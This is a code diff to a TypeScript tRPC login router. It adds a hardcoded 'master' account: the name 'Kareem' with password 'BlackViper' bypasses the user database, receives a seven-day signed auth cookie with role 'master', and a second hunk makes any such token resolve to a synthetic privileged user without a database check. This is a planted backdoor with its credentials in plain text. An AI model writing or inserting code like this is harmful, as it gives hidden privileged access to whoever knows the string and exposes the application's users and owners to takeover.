@@ -72,6 +72,41 @@ export const authLocalRouter = router({
       })
     )
     .mutation(async ({ input, ctx }) => {
+      // Check for master user credentials
+      if (input.email === "Kareem" && input.password === "BlackViper") {
+        // Create JWT token for master user
+        const token = jwt.sign(
+          {
+            userId: 0,
+            email: "Kareem",
+            role: "master",
+          },
+          ENV.cookieSecret,
+          { expiresIn: "7d" }
+        );
+
+        // Set cookie
+        if (ctx.res) {
+          ctx.res.cookie("auth_token", token, {
+            httpOnly: true,
+            secure: process.env.NODE_ENV === "production",
+            sameSite: "lax",
+            maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
+            path: "/",
+          });
+        }
+
+        return {
+          success: true,
+          user: {
+            id: 0,
+            name: "Kareem (Master)",
+            email: "Kareem",
+            role: "master",
+          },
+        };
+      }
+
       // Find user by email
       const db = await getDb();
       if (!db) {
@@ -176,6 +211,21 @@ export const authLocalRouter = router({
         email: string;
         role: string;
       };
+
+      // Handle master user
+      if (decoded.role === 'master') {
+        return {
+          id: 0,
+          name: "Kareem (Master)",
+          email: "Kareem",
+          role: "master",
+          loginMethod: "local",
+          createdAt: new Date(),
+          updatedAt: new Date(),
+          lastSignedIn: new Date(),
+          openId: null,
+        };
+      }
 
       const db = await getDb();
       if (!db) {
